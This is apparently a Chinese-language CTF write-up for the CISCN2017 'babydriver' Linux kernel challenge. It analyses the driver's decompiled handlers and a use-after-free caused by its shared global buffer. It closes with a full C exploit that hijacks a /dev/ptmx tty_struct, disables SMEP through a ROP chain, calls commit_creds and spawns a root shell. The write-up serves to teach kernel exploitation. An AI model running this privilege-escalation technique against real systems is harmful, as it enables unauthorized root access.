---
layout: post
title:  babydriver(CISCN2017)
date:   2025-01-12 00:08:01 +0300
image:  2025-01-12-red.jpg
tags:   [ctf,Pwn,kernel,ROP,UAF]
---

解cpio，查看init文件 

```assembly
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

所以我们要分析的文件应该是 /lib/modules/4.4.72/babydriver.ko

补一个gen.sh打包脚本

```assembly
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > rootfs.cpio
```

babyioctl

```assembly
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx
  __int64 result; // rax

  _fentry__(filp, command, arg);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB, v3, v3);
    result = 0xFFFFFFFFFFFFFFEALL;
  }
  return result;
}
```

babyopen

```assembly
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 0x40LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

babyrelease

```assembly
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```

babyread

```assembly
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return 0xFFFFFFFFFFFFFFFFLL;
  result = 0xFFFFFFFFFFFFFFFELL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);
    result = v6;
  }
  return result;
}
```

babywrite

```assembly
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return 0xFFFFFFFFFFFFFFFFLL;
  result = 0xFFFFFFFFFFFFFFFELL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();
    result = v6;
  }
  return result;
}
```

没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞：

- 如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。

接下来考虑如何通过 UAF 劫持程序执行流，这里我们选择 `tty_struct` 结构体作为 victim object。

在 `/dev` 下有一个伪终端设备 `ptmx` ，在我们打开这个设备时内核中会创建一个 `tty_struct` 结构体，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 `tty_operations`。

那么我们不难想到的是我们可以通过 UAF 劫持 `/dev/ptmx` 这个设备的 `tty_struct` 结构体与其内部的 `tty_operations` 函数表，那么在我们对这个设备进行相应操作（如 write、ioctl）时便会执行我们布置好的恶意函数指针。

由于没有开启 SMAP 保护，故我们可以在用户态进程的栈上布置 ROP 链与 `fake tty_operations` 结构体。

> 结构体 `tty_struct`位于`include/linux/tty.h` 中，`tty_operations` 位于 `include/linux/tty_driver.h` 中。

```assembly
struct tty_struct {
	struct kref kref;
	int index;
	struct device *dev;
	struct tty_driver *driver;
	struct tty_port *port;
	const struct tty_operations *ops;

	struct tty_ldisc *ldisc;
	struct ld_semaphore ldisc_sem;

	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	struct ktermios termios, termios_locked;
	char name[64];
	unsigned long flags;
	int count;
	unsigned int receive_room;
	struct winsize winsize;

	struct {
		spinlock_t lock;
		bool stopped;
		bool tco_stopped;
	} flow;

	struct {
		struct pid *pgrp;
		struct pid *session;
		spinlock_t lock;
		unsigned char pktstatus;
		bool packet;
	} ctrl;

	bool hw_stopped;
	bool closing;
	int flow_change;

	struct tty_struct *link;
	struct fasync_struct *fasync;
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	spinlock_t files_lock;
	int write_cnt;
	u8 *write_buf;

	struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096
	struct work_struct SAK_work;
} __randomize_layout;
```

这个tty_struct结构体的大小是0x2e0,在tty_struct结构体中有一个非常棒的结构体tty_operations,其源码如下

```assembly
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

ptmx设备是tty设备的一种,open函数被tty核心调用, 当一个用户对这个tty驱动被分配的设备节点调用open时tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说我们在调用了open函数了之后会创建一个tty_struct结构体,然而最关键的是这个tty_struct也是通过kmalloc申请出来的一个堆空间,下面是关于tty_struct结构体申请的一部分源码:

```assembly
struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
{
	struct tty_struct *tty;

	tty = kzalloc(sizeof(*tty), GFP_KERNEL);
	if (!tty)
		return NULL;

	kref_init(&tty->kref);
	tty->magic = TTY_MAGIC;
	tty_ldisc_init(tty);
	tty->session = NULL;
	tty->pgrp = NULL;
	mutex_init(&tty->legacy_mutex);
	mutex_init(&tty->throttle_mutex);
	init_rwsem(&tty->termios_rwsem);
	mutex_init(&tty->winsize_mutex);
	init_ldsem(&tty->ldisc_sem);
	init_waitqueue_head(&tty->write_wait);
	init_waitqueue_head(&tty->read_wait);
	INIT_WORK(&tty->hangup_work, do_tty_hangup);
	mutex_init(&tty->atomic_write_lock);
	spin_lock_init(&tty->ctrl_lock);
	spin_lock_init(&tty->flow_lock);
	INIT_LIST_HEAD(&tty->tty_files);
	INIT_WORK(&tty->SAK_work, do_SAK_work);

	tty->driver = driver;
	tty->ops = driver->ops;
	tty->index = idx;
	tty_line_name(driver, idx, tty->name);
	tty->dev = tty_get_device(tty);

	return tty;
}
```

其中kzalloc:

```assembly
static inline void *kzalloc(size_t size, gfp_t flags)
{
	return kmalloc(size, flags | __GFP_ZERO);
}
```

正是这个kmalloc的原因,根据前面介绍的slub分配机制,我们这里仍然可以利用UAF漏洞去修改这个结构体

调式

```assembly
# .text:0000000000000056                 mov     cs:babydev_struct.device_buf, rax
b *(lsmod+0x56)

   0xffffffffc0000047:  mov    rbp,rsp
   0xffffffffc000004a:  call   0xffffffff811ea180
   0xffffffffc000004f:  mov    rdi,0xffffffffc0001034
=> 0xffffffffc0000056:  mov    QWORD PTR [rip+0x2473],rax        # 0xffffffffc00024d0
   0xffffffffc000005d:  mov    QWORD PTR [rip+0x2470],0x40        # 0xffffffffc00024d8

得到struct地址
gdb-peda$ x/10gx 0xffffffffc00024d0
0xffffffffc00024d0:     0xffff880003616480      0x0000000000000040
0xffffffffc00024e0:     0x0000000000000000      0x0000000000000000
```

使用 gdb 进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 `tty_operaionts` 结构体到用户态的栈上.

内核中没有类似 `one_gadget` 一类的东西，因此为了完成 ROP 我们还需要进行一次**栈迁移**（从内核态到用户态）

```
gdb-peda$ p $rax
$1 = 0x7fffed513510
```

在执行wirte tty_struct结构体时，rax的值是用户态栈中fake_op的地址，也就是tty_operations结构体的首地址，所以可以找mov rsp, rax的gadget

```assembly
mov    rsp,rax
dec    ebx
jmp    0xffffffff8181bf7e
```

这个gadget相当于把栈迁了两次，一次是从内核到用户fake_op，第二次是fake_op到rop

EXP：

```assembly
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef


size_t commit_creds = 0xffffffff810a1420, prepare_kernel_cred = 0xffffffff810a1810;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}


void getRootPrivilige(void){
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


void getRootShell(void){   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

int main(void){
    saveStatus();


    int fd1 = open("/dev/babydev", 2);
    /*
    0xffffffffc000004f:  mov    rdi,0xffffffffc0001034
    => 0xffffffffc0000056:  mov    QWORD PTR [rip+0x2473],rax        # 0xffffffffc00024d0
    0xffffffffc000005d:  mov    QWORD PTR [rip+0x2470],0x40        # 0xffffffffc00024d8

    gdb-peda$ x/10gx 0xffffffffc00024d0
    0xffffffffc00024d0:     0xffff880003616480      0x0000000000000040
    0xffffffffc00024e0:     0x0000000000000000      0x0000000000000000
    */
    
    int fd2 = open("/dev/babydev", 2);
    /*
    0xffffffffc000004f:  mov    rdi,0xffffffffc0001034
    => 0xffffffffc0000056:  mov    QWORD PTR [rip+0x2473],rax        # 0xffffffffc00024d0
    0xffffffffc000005d:  mov    QWORD PTR [rip+0x2470],0x40        # 0xffffffffc00024d8
    0xffffffffc0000068:  call   0xffffffff8118b077
    0xffffffffc000006d:  xor    eax,eax
    0xffffffffc000006f:  pop    rbp
    [------------------------------------stack-------------------------------------]
    0000| 0xffff880000a67c58 --> 0xa67ca8
    0004| 0xffff880000a67c5c --> 0xffff8800
    0008| 0xffff880000a67c60 --> 0x8120ff7f
    0012| 0xffff880000a67c64 --> 0xffffffff
    0016| 0xffff880000a67c68 --> 0x27cfc88
    0020| 0xffff880000a67c6c --> 0xffff8800
    0024| 0xffff880000a67c70 --> 0x27cfc88
    0028| 0xffff880000a67c74 --> 0xffff8800
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value

    Breakpoint 1, 0xffffffffc0000056 in ?? ()
    gdb-peda$ p $rax
    $2 = 0xffff880003616380
    */

    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);


    int fd3 = open("/dev/ptmx", 2);


    size_t fake_tty[0x20];
    read(fd2, fake_tty, 0x40);
    printf("%x", fake_tty[3]);


    char buf[0x50];

    size_t rop[0x20], p = 0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = getRootPrivilige;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ_RET;
    rop[p++] = getRootShell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
    rop[p++] = user_ss;

    size_t fake_op[0x30];
    for(int i = 0; i < 0x10; i++)
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;

    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;


    fake_tty[3] = fake_op;  // user mode stack addr
    write(fd2, fake_tty, 0x40);

    write(fd3, buf, 0x8);

    return 0;
}
```

参考：

https://cc-sir.github.io/2019/08/24/Linux-kernel3/

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/#exploit